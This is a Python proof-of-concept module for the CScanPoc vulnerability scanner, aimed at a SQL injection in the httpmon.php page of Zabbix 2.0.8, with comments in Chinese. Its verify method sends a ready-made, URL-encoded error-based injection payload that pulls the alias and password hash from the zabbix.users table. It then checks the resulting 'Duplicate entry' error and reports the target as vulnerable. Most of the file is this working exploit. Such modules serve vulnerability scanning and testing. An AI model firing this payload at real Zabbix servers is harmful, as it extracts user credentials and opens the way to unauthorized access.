# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Zabbix_0001_p'  # 平台漏洞编号，留空
    name = 'Zabbix httpmon.php SQL 注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2013-10-04'  # 漏洞公布时间
    desc = '''
    Zabbix 的httpmon.php文件有一个SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zabbix'  # 漏洞应用名称
    product_version = ' Zabbix 2.0.8 '  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '341db92e-be19-4168-a680-9d8c06ffd3b5'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-22'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            payload = '''/httpmon.php?applications=2%20and%20%28select%201%20from%20%28select%20count%28*%29,concat%28%28select%28select%20concat%28cast%28concat%28alias,0x7e,passwd,0x7e%29%20as%20char%29,0x7e%29%29%20from%20zabbix.users%20LIMIT%200,1%29,floor%28rand%280%29*2%29%29x%20from%20information_schema.tables%20group%20by%20x%29a%29'''

            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.get('{target}{payload}'.format(
                target=self.target, payload=payload))
            r = request.text
            reg = re.compile("Duplicate entry '(.*?)~~1' for key")
            res = reg.findall(request.text)
            if res and "web.httpmon.applications" in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
